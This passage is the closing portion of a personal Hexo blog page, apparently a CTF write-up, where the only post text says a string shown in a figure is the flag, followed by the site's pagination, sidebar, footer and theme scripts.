class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å›¾ä¸­çš„<code>this is example</code>å°±æ˜¯flagã€‚</p>
<p><img src="12.png" alt="" /></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/9/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/">9</a><span class="page-number current">10</span><a class="page-number" href="/page/11/">11</a><span class="space">&hellip;</span><a class="page-number" href="/page/14/">14</a><a class="extend next" rel="next" href="/page/11/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">CoLin</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">133</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">18</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/Hornos3" title="GitHub â†’ https:&#x2F;&#x2F;github.com&#x2F;Hornos3" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://blog.csdn.net/qq_54218833?spm=1000.2115.3001.5343" title="CSDN â†’ https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_54218833?spm&#x3D;1000.2115.3001.5343" rel="noopener" target="_blank"><i class="fa fa-crosshairs fa-fw"></i>CSDN</a>
      </span>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">CoLin</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
      <span class="post-meta-item-text">Symbols count total: </span>
    <span title="Symbols count total">1.2m</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
      <span class="post-meta-item-text">Reading time total &asymp;</span>
    <span title="Reading time total">17:36</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a>
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

  

</body>
</html>
